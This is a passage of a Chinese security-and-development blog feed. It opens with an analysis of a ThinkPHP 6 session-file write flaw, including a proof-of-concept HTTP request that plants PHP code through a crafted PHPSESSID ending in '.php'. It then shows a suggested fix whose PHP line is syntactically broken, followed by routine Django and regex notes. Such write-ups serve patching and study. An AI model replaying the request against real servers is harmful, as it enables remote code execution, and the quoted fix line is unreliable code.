class="line">$request-&gt;cookie($cookieName);这个里面看一下</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">'PHPSESSID'</span>; 发现是这个参数</span><br><span class="line"></span><br><span class="line">所以这个值就从PHPSESSID传就好了</span><br></pre></td></tr></table></figure><p>然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方</p><p>最后保存session数据 在代码tp6/vendor/topthink/framework/src/think/session/Store.php<br>跟进这个write方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);</span><br><span class="line">这里的 handler 是  继承的think\session\driver\file.php</span><br></pre></td></tr></table></figure><p>跟进这个write方法<br>tp6/vendor/topthink/framework/src/think/session/driver/File.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(string $sessID, string $sessData)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getFileName($sessID, <span class="keyword">true</span>);</span><br><span class="line">        $data     = $sessData;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile($filename, $data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有文件名的处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getFileName($sessID, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileName</span><span class="params">(string $name, bool $auto = false)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;config[<span class="string">'prefix'</span>] . DIRECTORY_SEPARATOR . <span class="string">'sess_'</span> . $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $name = <span class="string">'sess_'</span> . $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;config[<span class="string">'path'</span>] . $name;</span><br><span class="line">        $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件名只进行了路径拼接和加前缀</p><p>数据压缩没啥用 跟进 <code>$this-&gt;writeFile($filename, $data);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span><span class="params">($path, $content)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>直接写入了。这样就出现问题了，文件名可控，XXX.php 里面的内容是序列化之后的，但是可控制话也说直接getshell</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>根据我写的控制器<br>构造数据包</p><p>注意 session PHPSESSID= 后面要按照要求必须 32位 可以随便构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /tp6/<span class="keyword">public</span>/index.php/index/test1 HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 24</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/tp6/public/index.php/index/test1</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=1234567890123456789012345678.php; </span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">key=&lt;?php%20phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是找到这个文件</p><p>一般位于项目根目录下的./runtime/session/文件夹下，<br>加上之前前缀的拼接，那就是<br>/runtime/session/sess_1234567890123456789012345678.php</p><p>然后成功<br><img src="https://img-blog.csdnimg.cn/20200212175854419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方也给出方案</p><p>对session id 加一个过滤 使用 ctype_alnum（）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ctype_alnum（$id） &amp;&amp; ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django-数据库操作-未完</title>
      <link href="/2020/02/07/Django-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%9C%AA%E5%AE%8C/"/>
      <url>/2020/02/07/Django-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%9C%AA%E5%AE%8C/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Django-数据库操作</p><p>在settings.py文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql         <span class="comment"># 一定要添加这两行！通过pip install pymysql！</span></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br><span class="line"><span class="comment"># 修改DATABASES的值</span></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'mysite'</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'192.168.1.1'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'pwd'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建数据 数据类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    uid = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 自增长ID,必须带参数为primary_key=True,并且是唯一主键</span></span><br><span class="line">    user = models.CharField(max_length=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 字符串类型，最大长度为10</span></span><br><span class="line">    age = models.IntegerField(default=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 数字类型，默认为1</span></span><br><span class="line">    sex = models.BooleanField()</span><br><span class="line">    <span class="comment"># BOOL类型</span></span><br><span class="line">    email = models.EmailField()</span><br><span class="line">    <span class="comment"># 自带检查 Email 合法性的 CharField</span></span><br><span class="line">    Intor = models.TextField()</span><br><span class="line">    <span class="comment"># 长文本类型</span></span><br><span class="line">    Blog = models.URLField()</span><br><span class="line">    <span class="comment"># 自带检查 URL 合法性的 CharField</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------文件上传-----------------</span></span><br><span class="line">    upload = models.FileField(upload_to=<span class="string">'uploads/'</span>)</span><br><span class="line">    <span class="comment"># 文件上传到 MEDIA_ROOT/uploads</span></span><br><span class="line">    <span class="comment"># 这个字段不能设置primary_key和unique选项.在数据库中存储类型是varchar，默认最大长度为100.</span></span><br><span class="line">    upload_s = models.FileField(upload_to=<span class="string">'uploads/%Y/%m/%d/'</span>)</span><br><span class="line">    <span class="comment"># 文件上传到 MEDIA_ROOT/uploads/2019/07/04</span></span><br><span class="line"></span><br><span class="line">    upload_e = models.FilePathField(path=<span class="string">"/home/images"</span>, match=<span class="string">"foo.*"</span>, recursive=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 这个字段的值被限制在系统上某个目录中的所有文件名集合中。有三个参数</span></span><br><span class="line">    <span class="comment"># 　　　　path = '':  该参数必需。上行所说的‘某个目录’的绝对路径。Example: "/home/images".</span></span><br><span class="line">    <span class="comment"># 　　　　match = 'pattern':  可选参数。格式是正则表达式。用来拣选符合匹配正则表达式的文件</span></span><br><span class="line">    <span class="comment"># 　　　　recursive = True / False: 可选参数，默认为False。设定是否递归该目录下所有子目录的所有文件</span></span><br><span class="line"></span><br><span class="line">    add_date = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 设置初次创建的时间</span></span><br><span class="line">    update_date = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 设置最后修改的时间</span></span><br></pre></td></tr></table></figure><p>创建数据库一共需要三步：</p><p>修改models.py中模型<br>运行python3 manage.py makemigrations为改动创建迁移记录<br>运行python3 manage.py migrate，将操作同步到数据库。</p><h2 id="数据增删改查"><a href="#数据增删改查" class="headerlink" title="数据增删改查"></a>数据增删改查</h2><p>数据的添加方法：一步到位的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.objects.create(User=<span class="string">'zz'</span>)</span><br></pre></td></tr></table></figure><p>单个赋值的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">datas = data()</span><br><span class="line">datas.User = <span class="string">'陈二狗'</span></span><br><span class="line">datas.save()</span><br></pre></td></tr></table></figure><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><h2 id="常规的有5种方法获取数据，返回都是数据集"><a href="#常规的有5种方法获取数据，返回都是数据集" class="headerlink" title="常规的有5种方法获取数据，返回都是数据集"></a>常规的有5种方法获取数据，返回都是数据集</h2><p>第一种是 data.objects.all()</p><p>这种方法获取的是这张表里面的所有数据</p><p>第二种是 data.objects.get(id=1)</p><p><strong>这个比较坑，不常用，找不到直接异常</strong><br>这种方法必须确保获取的结果只有一个（多个对象会直接异常），没有匹配条件的时候会报异常，获取的条件是id=1</p><p>第三种方法是 data.objects.filter(id=2)</p><p>这种方法是筛选出id=2的数据,括号内还能有多个条件，比如(id=2,gender=’boy’)</p><p>第四种方法是 data.objects.exclude(id=2)</p><p>这种方法是获取到id不等于2的数据</p><p>第五种方法是 data.objects.order_by(name)</p><p>这种方法获取到的结果是按照name进行排序后的结果</p><h4 id="获取单个对象"><a href="#获取单个对象" class="headerlink" title="获取单个对象"></a>获取单个对象</h4><p>第一种方法是 data.objects.first(name=’zeo’)<br>                        data.objects.last(name=’zeo’)</p><p>这种方法获取到的结果是符合条件的第一个对象，当然还有最后一个对象，使用的是.last(name=’小桃红’)</p><p><strong>注释：这些方法都可迭代使用</strong></p><p>按照日期获取当天数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils <span class="keyword">import</span> timezone</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">now = timezone.now()</span><br><span class="line">start = now - timedelta(hours=<span class="number">23</span>,minutes=<span class="number">59</span>,seconds=<span class="number">59</span>)</span><br><span class="line">CurrentDaySubdomain = URL.objects.filter(change_time__gt=start)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> CurrentDaySubdomain:</span><br><span class="line">    print(c.url)</span><br></pre></td></tr></table></figure><p><strong><em>其他按照时间获取数据方法</em></strong></p><p>1、gt：大于某个时间<br>now = datetime.datetime.now()</p><p>start = now – datetime.timedelta(hours=23, minutes=59, seconds=59)<br>a=yourobject.objects .filter(youdatetimcolumn__gt=start)#前一天</p><p>2、gte：大于等于某个时间：<br>a=yourobject.objects .filter(youdatetimcolumn__gte=start)</p><p>3、lt：小于<br>a=yourobject.objects .filter(youdatetimcolumn__lt=start)</p><p>4、lte：小于等于<br>a=yourobject.objects .filter(youdatetimcolumn__lte=start)</p><p>5、range：查询时间段<br>start_date = datetime.date(2005, 1, 1)<br>end_date = datetime.date(2005, 3, 31)<br>Entry.objects.filter(pub_date__range=(start_date, end_date))</p><p>6、year：查询某年<br>Entry.objects.filter(pub_date__year=2005)</p><p>7、month：查询某月<br>Entry.objects.filter(pub_date__month=12)</p><p>8、day：某天<br>Entry.objects.filter(pub_date__day=3)</p><p>9、week_day：星期几<br>Entry.objects.filter(pub_date__week_day=2)</p><p>10、获取今天的日期，日期格式为yyyy-MM-dd</p><p>from django.utils.timezone import now, timedelta<br>date = now().date() + timedelta(days=-1) #昨天<br>date = now().date() + timedelta(days=0) #今天<br>date = now().date() + timedelta(days=1) #明天</p><p><strong>以上方法获取的数据的结果是QuerySet()类型的数据，是一个结果类，想要获取最后的实际结果，需要使用索引获取</strong></p><p>datas = data.objects.filter(id=2).values()[0]<br>这样的结果是一个字典，索引0即是获取values()列表的第一个结果</p><p>当然你也可以使用赋予变量的形式进行获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">datas = data.objects.get(id=<span class="number">1</span>)</span><br><span class="line">u_id = datas.id</span><br><span class="line">u_User = datas.User</span><br><span class="line"></span><br><span class="line">这种方式进行获取数据，这个前提是在只有一个数据的情况下进行</span><br></pre></td></tr></table></figure><p>如果是all()或者其他方法获取较多的数据集时候，也可以这样获取每个结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data_0 = data.objects.all()</span><br><span class="line"><span class="comment"># 这里的结果是一个数据集合，可以循环迭代和使用索引获取值</span></span><br><span class="line">data_1 = data_0[<span class="number">0</span>]</span><br><span class="line">u_id = data_1.id</span><br><span class="line">u_User = data_1.User</span><br><span class="line"><span class="comment"># 通过这样的方式，就可以实现进行单独数据的获取</span></span><br></pre></td></tr></table></figure><p>像这种的集合，如果想要把里面的数据全都打印出来，可以这么处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ret = <span class="string">''</span></span><br><span class="line">data_0 = data.objects.all()</span><br><span class="line"><span class="keyword">for</span> data_1 <span class="keyword">in</span> data_0:</span><br><span class="line">    ret += data_1.id + <span class="string">'|'</span> + data_1.User + <span class="string">'&lt;br&gt;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django-笔记-创建</title>
      <link href="/2020/02/07/Django-%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA/"/>
      <url>/2020/02/07/Django-%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject Your_Project_Name</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Your_Project_Name/ <span class="comment"># 你存放项目的文件夹</span></span><br><span class="line">    manage.py      <span class="comment"># 命令行工具，可以用来启动Django，等等做很多事</span></span><br><span class="line">    Your_Project_Name/ <span class="comment"># 目录是真正的项目文件包裹目录，它的名字是你引用内部文件的包名</span></span><br><span class="line">        __init__.py       <span class="comment"># 定义包的空文件</span></span><br><span class="line">        settings.py       <span class="comment"># 项目的主配置文件</span></span><br><span class="line">        urls.py           <span class="comment"># 路由管理，相当于Flask中自己写的app.route('/')，不过这里统一管理，很方便</span></span><br><span class="line">        wsgi.py           <span class="comment"># 基于WSGI的web服务器进入点，提供底层的网络通信功能</span></span><br></pre></td></tr></table></figure><h2 id="APP模块添加"><a href="#APP模块添加" class="headerlink" title="APP模块添加"></a>APP模块添加</h2><p>比如你的项目下有个登陆功能，暂且把这个登陆的模块名叫做login，这个登陆的应用需要你使用命令生成然后进行配置，首先到你创建项目的文件夹下面，使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp login</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">login/        <span class="comment"># 该登陆模块的文件夹</span></span><br><span class="line">    __init__.py <span class="comment"># 包空文件</span></span><br><span class="line">    admin.py    <span class="comment"># 自动生成强大的后台管理文件</span></span><br><span class="line">    apps.py        <span class="comment"># 具体我不清楚</span></span><br><span class="line">    migrations/ <span class="comment"># 这个文件夹用来操作管理数据库的数据，可以做数据库的迁移之类</span></span><br><span class="line">        __init__.py <span class="comment"># </span></span><br><span class="line">    models.py    <span class="comment"># 用来生成数据库的文件，和Flask中的modules.py一毛一样呢</span></span><br><span class="line">    tests.py    <span class="comment"># 用来做测试代码的文件，啊，真是贴心呢</span></span><br><span class="line">    views.py    <span class="comment"># 就像Flask中的视图函数，不过这里专门分了一个文件让你写视图函数</span></span><br></pre></td></tr></table></figure><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver</span><br><span class="line"><span class="comment"># 启动,默认端口8000</span></span><br><span class="line">python3 manage.py runserver <span class="number">8080</span></span><br><span class="line"><span class="comment"># 启动，使用8080端口</span></span><br><span class="line">python3 manage.py runserver <span class="number">0</span>:<span class="number">8080</span></span><br><span class="line">并且修改文件settings.py</span><br><span class="line">ALLOWED_HOSTS = [<span class="string">'*'</span>,]</span><br><span class="line"><span class="comment"># 启动，监听所有人的访问，即允许所有人访问</span></span><br></pre></td></tr></table></figure><h2 id="路由urls-py"><a href="#路由urls-py" class="headerlink" title="路由urls.py"></a>路由urls.py</h2><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="comment"># 这个path函数的功能比较重要，最下面会说</span></span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> index,error</span><br><span class="line"><span class="comment"># 从视图函数文件中导入创建的两个视图函数</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">''</span>, index, name=<span class="string">'index'</span>),</span><br><span class="line">    <span class="comment"># 这里第一个是网址路由，第二个是视图函数，第三个是视图函数指定的名称，可以在任何地方使用这个名称调用这个视图函数</span></span><br><span class="line">    <span class="comment"># 哇塞，真实贴心实用呢</span></span><br><span class="line">    path(<span class="string">'error/'</span>, error, name=<span class="string">'error'</span>)</span><br><span class="line">    <span class="comment"># 这个的url目录就是error啦</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>使用静态文件<br>然后再根目录下面的settings.py中，</p><p>在底部添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line">STATICFILES_DIRS = (</span><br><span class="line">    os.path.join(os.path.join(BASE_DIR, <span class="string">'static'</span>)),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>设置html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="comment">#这句添加在html文件的最上面  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在需要的地方按照这个格式进行调用，如：</span></span><br><span class="line">&lt;img src=<span class="string">"&#123;% static 'image/404.jpg' %&#125;"</span>/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这里是引用z</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PATH函数功能</span><br><span class="line">path() 参数： route</span><br><span class="line">route 是一个匹配 URL 的准则（类似正则表达式）。当 Django 响应一个请求时，它会从 urlpatterns 的第一项开始，按顺序依次匹配列表中的项，直到找到匹配的项。</span><br><span class="line"></span><br><span class="line">这些准则不会匹配 GET 和 POST 参数或域名。例如，URLconf 在处理请求 https:<span class="comment">//www.example.com/myapp/ 时，它会尝试匹配 myapp/ 。处理请求 https://www.example.com/myapp/?page=3 时，也只会尝试匹配 myapp/。</span></span><br><span class="line"></span><br><span class="line">path() 参数： view</span><br><span class="line">当 Django 找到了一个匹配的准则，就会调用这个特定的视图函数，并传入一个 HttpRequest 对象作为第一个参数，被“捕获”的参数以关键字参数的形式传入。稍后，我们会给出一个例子。</span><br><span class="line"></span><br><span class="line">path() 参数： kwargs</span><br><span class="line">任意个关键字参数可以作为一个字典传递给目标视图函数。本教程中不会使用这一特性。</span><br><span class="line"></span><br><span class="line">path() 参数： name</span><br><span class="line">为你的 URL 取名能使你在 Django 的任意地方唯一地引用它，尤其是在模板中。这个有用的特性允许你只改一个文件就能全局地修改某个 URL 模式。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 正则表达式</title>
      <link href="/2020/02/07/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/02/07/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Python 正则表达式</p><p>速查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>匹配次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.         匹配任意字符一次</span><br><span class="line">*         匹配前面的表达式<span class="number">0</span>/n次</span><br><span class="line">+         匹配前面的表达式<span class="number">1</span>/n次</span><br><span class="line">？        匹配前面的表达式<span class="number">0</span>/<span class="number">1</span>次</span><br><span class="line">&#123;m&#125;        匹配前面的表达式m次</span><br><span class="line">&#123;m,n&#125;     匹配前面的表达式m到n次</span><br><span class="line">*？       匹配前面的表达式<span class="number">0</span>次</span><br><span class="line">+？       匹配前面的表达式<span class="number">1</span>次</span><br></pre></td></tr></table></figure><p>常用语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">re.S    匹配所有的字符</span><br><span class="line">re.I    匹配大小写</span><br><span class="line">re.M    多行匹配</span><br><span class="line">re.match从头开始匹配</span><br><span class="line">re.search全文匹配</span><br><span class="line">\d         